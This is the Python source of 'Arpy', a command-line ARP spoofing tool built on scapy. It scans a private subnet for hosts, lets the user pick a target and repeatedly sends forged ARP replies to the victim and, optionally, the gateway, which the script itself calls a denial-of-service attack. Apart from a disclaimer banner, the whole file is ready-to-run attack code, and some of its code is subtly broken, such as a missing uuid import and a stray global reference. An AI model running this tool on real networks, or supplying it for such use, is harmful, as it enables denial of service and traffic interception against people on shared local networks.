#imports
from scapy.all import *
from collections import OrderedDict
from addons.ui import Ui
from termcolor import colored

import argparse
import os
from sys import stderr, exit, stdout
from uuid import getnode
from time import sleep
import ipaddress as ip 
import threading
import queue


class Arpy:
    """Objects of this class contain methods which can launch an ARP spoofing attack. This particular script was is not meant
       to be modified, it should be interacted from the command line, you are welcome to read it so as to gain bettter understading of the 
       underlying features
    """

    LOGO ="""
             _____    _____   __     __
     /\     |  __ \  |  __ \  \ \   / /
    /  \    | |__) | | |__) |  \ \_/ / 
   / /\ \   |  _  /  |  ___/    \   /  
  / ____ \  | | \ \  | |         | |   
 /_/    \_\ |_|  \_\ |_|         |_|   
                                       
                                       
""" 
    MSG = "This is the command line interface for Arpy, please do not use this for malicious intent, this is purely for educational purposes"
    
    #Variables that should not be altered
    __INTERVAL = 3
    __IP_QUEUE = queue.Queue()
    __LOCAL_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    __IP_TO_MAC = dict()
    __INDEX_TO_IP = OrderedDict()
    __OS_NAME = os.name
    __THREADS = list()
    
    def __init__(self, subnet:str, gateway:str, mac:str = __LOCAL_MAC, interval:int = __INTERVAL,two_way_flag:bool = False):
        """This method initialises the object and validates the object attributes
           
           :param subnet: Network address, e.g 192.168.1.0/24
           :param gateway: IP address of gateway
           :param mac: MAC address of attacker, this can be changed using the setter method set_mac(), see below
           :param interval: interval in seconds between gratuitous ARP reply to target/s
           :param two_way_flag: A bolean value which decides whether the ARP spoofing attacking in two way or on way
        """

        self.__MAC = mac 
        self.subnet = subnet
        self.gateway = gateway
        self.interval = interval
        self.two_way_flag = two_way_flag
        
        self.__check_obj_attribute()
        
        for ip_addr in list(self.subnet.hosts()):
            self.__IP_QUEUE.put(str(ip_addr))
        if os.name == "nt":
           try:
               from colorama import init 
               init()
           except Exception as e:
               print(e)
                
        self.__UI()
    
    def __check_obj_attribute(self):
        """This method validates attributes of instances of this class, e.g correct types, valid IP addresses
           
        """
        try:
           
           private_subnet =  ip.IPv4Network(self.subnet).is_private
           private_gateway = ip.ip_address(self.gateway).is_private
           self.subnet = ip.IPv4Network(self.subnet)
           
           if private_subnet and private_gateway:
              pass 
           else:
              exit("\nIp address is not private, please check both network address and IP address of gateway")
        
        except ip.AddressValueError:
            exit("\nInvalid IP Address") 
        
        except ip.NetmaskValueError:
            exit("\nInvalid subnet mask value")
        
        if (type(self.interval) is int) :
            if (self.interval > 0):
                pass
            else:
                raise ValueError(f"self.interval={self.interval}, should be a positive integer")
        elif (type(self.interval is None)):
             self.interval = self.__INTERVAL
        else:
          self.__error("self.interval", 2, TypeError )
        
        if type(self.two_way_flag) is not bool:
           self.__error("self.two_way_flag", True, TypeError )
        

        
    def __error(self, var:str , correct_type, err_name):
        """This private method  throws exceptions when the user assigns an attribute of incorrect type
           
           :param var: The name of the variable which was wrongy assigned in strings, e.g "self.__INTERVAL"
           :param correct_type: The type of data the user should have used, in this an arbitrary example of the type must be supplied, e.g 3 -> which is an int, False-> Which is a bool
           :param err_name: The name of the exception to throw, e.g TypeError

           usage: self.__error("self.__INTERVAL", 3, TypeError)
        """
        variable_value = eval(var)
        error=err_name(f"{var}={variable_value}, is of type {type(variable_value)}, it should be of type {type(correct_type)}")
        raise error

 

    def __UI(self):
        """This method initialises the command line interface for the user
        """
        print(colored(self.LOGO, "green"))
        print(colored(self.MSG,"green"))
        print("[*] Object Attributes seems ok")
        
        if self.__OS_NAME == "nt":
           print(f"[*] Windows detected as OS")
        
        elif self.__OS_NAME == "posix":
           print("[*] Linux detected as OS, you may need to run the program as root")
        
        else:
           exit("[-]Unknown OS, exiting program")    

        if self.two_way_flag :
           print("[*] Two way poisoning: Enabled")
        else:
           print("[*] Two way poisoning: Disabled") 

    def __get_mac(self,target:str =None):
        """This private method is invoked by get_mac
          
          :param target: IP addres of target, if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
        """

        
        if target is None:
            while True:
              try:
                 current_ip=self.__IP_QUEUE.get_nowait()
                 print("{}\r".format(current_ip),end="")
                 arp_ans = sr1(ARP(pdst=current_ip,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                 tgt_mac = arp_ans[0].hwsrc
                 self.__IP_TO_MAC.update({current_ip:tgt_mac})
              except queue.Empty:
                   break
                   
              except TypeError:
                   pass

              except KeyboardInterrupt:
                   exit()
        else:
            try:
              
                arp_ans = sr1(ARP(pdst=target,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                tgt_mac = arp_ans[0].hwsrc
                self.__IP_TO_MAC.update({target:tgt_mac})
            
            except TypeError:
                exit("\nTarget is down or did not respond")
            
            except KeyboardInterrupt:
                exit("\n User ended program")


    
    def get_mac(self,target:str =None,threads:int =5):
        """This method is supposed to be accessed by the user, the latter spawns a specified number of threads to scan all the IP address on the network concurrently

           :param target: The IP address of the target,  if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
           :param threads: The number of threads to be spawned to scan the network concurrently, defaults to 5 
        """
        
        if (type(threads) is float) or (type(threads) is int):
           threads = int(abs(threads))
        else:
            raise TypeError(f"thread={threads}, is of type {type(threads)}, it should be of type {type(1)}")

        if target is None:
           print(f"[*] Starting {threads} threads")
           sleep(2)
           for _ in range(threads):
              self.__THREADS.append(threading.Thread(target=self.__get_mac,daemon=True))
           
           for thread in self.__THREADS:
               thread.start()

           for thread in self.__THREADS:
               thread.join()
        else:
           self.__get_mac(target)
   
    def set_mac(self,mac:str): 
        """setter methos which changes MAC address of attacker
           param mac: MAC address to change to
        """
        self.__LOCAL_MAC = mac

    def shell(self):
        """This method should be invoked by the user as it provides them with pseudo interactive shell to lauch the attack"""

        print("")
        for index,key in enumerate(self.__IP_TO_MAC):
            print("{} | {} -> {}".format(index,key,self.__IP_TO_MAC.get(key)))
            self.__INDEX_TO_IP.update({int(index):key})
        print("")
        while True:
               try:
               
                first_index = list(self.__INDEX_TO_IP.keys())[0]
                last_index = list(self.__INDEX_TO_IP.keys())[-1]
                uindex = int(input("Enter index of target to attack[{}-{}]: ".format(first_index,last_index)))
                
                if (uindex >= first_index and uindex <= last_index):
                   self.__inject_packet(uindex, interval=self.interval)

              
               except ValueError:
                 exit("\nInvalid input")
               except KeyboardInterrupt:
                 exit("\nUser ended program")
               except Exception as e:
                 exit(f"{e}")

    def __inject_packet(self,uindex:int , interval:int):
            """The method that actually lauches the attack and is invoked after the user selects the target
           
           :param uindex: Index of target, selected by the user
           :interval: interval in seconds between gratuitous ARP reply to target/s
            """
        
            try:
                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=parse.gateway_ip, pdst=self.__INDEX_TO_IP.get(uindex), hwdst=self.__IP_TO_MAC.get(self.__INDEX_TO_IP.get(uindex)))
                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.__INDEX_TO_IP.get(uindex), pdst=self.gateway, hwdst=self.__IP_TO_MAC.get(self.gateway), hwsrc=self.__LOCAL_MAC)
                 count = 1
                 stdout.write("DOS attack in progress. Press CTRL+C to end\n")
                 threading.Thread(target=Ui.load, daemon=True).start()

                 while True :
                     send(unsolicited_arp_rep_to_tgt,verbose=False)
                     if self.two_way_flag:
                        send(unsolicited_arp_rep_to_gtw, verbose=False)
                     stdout.write("   Packet(s) sent : {}\r".format(count))
                     count += 1
                     sleep(interval)
            except KeyboardInterrupt:
                exit("\nUser ended program")
           



if __name__ == "__main__":
    
    """The code below initialises parses command line arguement"""
    parser = argparse.ArgumentParser(formatter_class = argparse.RawTextHelpFormatter,description="This script shows how easily a malicious user can cause a Denial Of Service attack in a home network once he is connect to it. NOTE : This is for demonstration purposes only and will not work in an enterprise environment where security mechanisms such as dynamic ARP inspection(DAI) are enabled.\n\n To truly how this work I would recommed to use wireshark",epilog="Example:\n\tsudo python3 arp_dos.py -S 192.168.100.0/24 -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -S 192.168.100.0/24 -G 192.168.100.1" )
    parser.add_argument("-S","--subnet",help="Network address of subnet e.g 192.168.100.0/24",metavar="subnet_ip", required=True, dest="subnet",type=str)
    parser.add_argument("-G","--gateway", help="IP address of default gateway",metavar="gateway_ip ",required=True,dest="gateway_ip")
    parser.add_argument("-Tgt", "--target", help="Ip address of target", dest="target", required=False, default=None)
    parser.add_argument("-T", "--threads", help="Number of threads to use when scanning network, defaults to 5", dest="threads", required=False, type=int, default=5)
    parser.add_argument("-I","--interval", help="Elapsed second between each ARP packet when Arpying ARP cache of target", required=False,dest="interval", metavar="interval", type=int)
    parser.add_argument("-2", help="enables 2 way poisoning, defaults to False",action="store_true", required=False, dest="twoway")
    parse = parser.parse_args()
 
    """The only 3 lines you will need if you decide to use this tool as a module in your project :)"""
    psn = Arpy(parse.subnet, parse.gateway_ip, interval = parse.interval,two_way_flag=parse.twoway)
    psn.get_mac(threads=parse.threads,target = parse.target)
    psn.shell()   
 







